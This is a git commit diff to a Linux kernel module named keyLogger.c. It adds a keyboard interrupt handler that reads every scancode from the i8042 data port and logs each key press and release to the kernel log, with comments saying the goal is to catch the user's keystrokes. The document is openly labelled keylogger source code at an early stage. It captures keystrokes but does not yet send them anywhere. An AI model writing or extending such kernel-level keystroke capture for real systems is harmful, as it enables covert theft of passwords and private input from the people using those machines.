03371ed920494415defa9aef27e7658347a78b22
greengon <greengon1991@gmail.com>
2019-01-02 05:01:56 -0800

    Add some code which will catch keybpard interupts

--- keyLogger.c
+++ keyLogger.c
@@ -10,13 +10,34 @@
 
 #include <linux/module.h>
 #include <linux/kernel.h>
+#include <linux/interrupt.h>
+#include <asm/io.h>
+
+#define KBD_IRQ 1 /* IRQ number for keyboard (i8042) */
+#define KBD_DATA_REG 0x60 /* I/O port for keyboard data */
+#define KBD_SCANCODE_MASK 0x7f
+#define KBD_STATUS_MASK 0x80
+
+static irqreturn_t kbd2_isr(int irq, void *dev_id){
+	char scancode;
+
+	scancode = inb(KBD_DATA_REG);
+	pr_info("Scan Code %x %s\n",scancode & KBD_SCANCODE_MASK,scancode & KBD_STATUS_MASK ? "Released" : "Pressed");
+
+	return IRQ_HANDLED;
+}
 
 static int __init keyLogger_birth(void){
 	pr_info("A new keyLogger was born\n");
+
+	// First lets try to catch kystroke from user
+	// and print it to the log.
+	return request_irq(KBD_IRQ, kbd2_isr, IRQF_SHARED,"kbd2", (void *)kbd2_isr);
 }
 
 static void __exit keyLogger_death(void){
 	pr_info("The keyLogger is dead\n");
+	free_irq(KBD_IRQ, (void *)kbd2_isr);
 }
 
 module_init(keyLogger_birth);
